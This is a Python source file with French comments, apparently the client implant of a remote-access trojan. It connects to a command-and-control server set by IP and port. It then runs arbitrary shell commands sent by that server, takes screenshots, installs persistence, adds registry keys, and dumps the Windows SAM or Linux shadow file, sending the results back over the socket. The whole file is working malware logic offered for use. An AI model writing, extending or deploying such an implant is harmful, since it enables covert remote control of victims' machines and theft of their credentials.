#Client principal
import socket
import json
import struct
import platform
import argparse

ENCODING ="utf-8"
RETRY_DELAY = 5

#Config host serveur

def parse_args():
    """parser de config server host"""
    p = argparse.ArgumentParser()
    p.add_argument("-ip", required=True, help="IP du serveur")
    p.add_argument("-port", type=int, required=True, help="port du serveur")
    return p.parse_args()

ARGS = parse_args()

SERVER_HOST = ARGS.ip
SERVER_PORT= ARGS.port

os_type = platform.system()

#Detection de l'OS

if os_type == "Windows":
    from modules.win import *
elif os_type == "Linux":
    from modules.lin import *
else:
    print("OS non supporté")
    exit()

#Fonctions primaires du client, envoyer, recevoir des données

def send_msg(sock, payload: dict) -> None:
    """Pour envoyer un json à C2"""
    data = json.dumps(payload).encode(ENCODING)
    sock.sendall(len(data).to_bytes(4, "big") + data)


def send_bytes(sock, blob: bytes, meta: dict) -> None:
    """Pour envoyer les screenshots"""

    send_msg(sock, meta)
    sock.sendall(len(blob).to_bytes(4, "big") + blob)


def _receiveN(sock, n: int) -> bytes | None:
    """Pour lire n octets d'un message de C2"""
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def receiveMessage(sock) -> dict:
    """Pour recevoir un msg du C2"""

    raw_len = _receiveN(sock, 4)
    if raw_len is None:
        raise ConnectionError("connexion coupée par le serveur")
    
    data = _receiveN(sock, int.from_bytes(raw_len, "big"))

    if data is None:
        raise ConnectionError("connexion interrompue en cours de message")
    return json.loads(data.decode(ENCODING))


#Config des commandes exe


def cmd_screenshot(sock) -> None:
    png = take_screenshot()
    send_bytes(sock, png, {"status": "ok", "format": "png"})


def cmd_sysinfo(sock) -> None:
    send_msg(sock, {"status": "ok", "data": get_sysinfo()})


def cmd_list_users(sock) -> None:
    if IS_WINDOWS:
        result = run_shell("net user")
    else:
        result = run_shell("cut -d: -f1 /etc/passwd")
    send_msg(sock, result)



def handle_command(sock, msg: dict):
    """ le client recoit un mot clé du serveur pour la commande à executer, donc si il recoit screenshot alors il executera la fonction screenshot du module associé à l'OS"""
    cmd = msg.get("cmd", "").lower().strip()

    try:
        if cmd == "screenshot":
            cmd_screenshot(sock)

        elif cmd == "sysinfo":
            cmd_sysinfo(sock)

        elif cmd == "shell":
            #Si le C2 envoie une commande a executer, le client pourra la catch grace à ce mot clé
            command = msg.get("command", "")
            result = run_shell(command)          
            send_msg(sock, result)

        elif cmd == "list_users":
            cmd_list_users(sock)

        elif cmd == "ip":
            send_msg(sock, {"status": "ok", "ip": get_real_ip()})

        elif cmd == "persistence":
            result = install_persistence()      
            send_msg(sock, result)

        #Windows
        elif cmd == "sam" and os_type == "Windows":
            result = dump_sam()
            send_msg(sock, result)

        elif cmd == "registry" and os_type == "Windows":
            result = add_registry_key()
            send_msg(sock, result)

        #Linux
        elif cmd == "shadow" and os_type == "Linux":
            result = get_passwd_shadow()
            send_msg(sock, result)

        elif cmd == "list_home" and os_type == "Linux":
            result = list_sensitive_dirs()
            send_msg(sock, result)

        else:
            send_msg(sock, {
                "status": "error",
                "message": f"commande inconnue ou non supportée sur {os_type}: {cmd}"
            })

    except Exception as e:
        send_msg(sock, {
            "status": "error",
            "message": str(e)
        })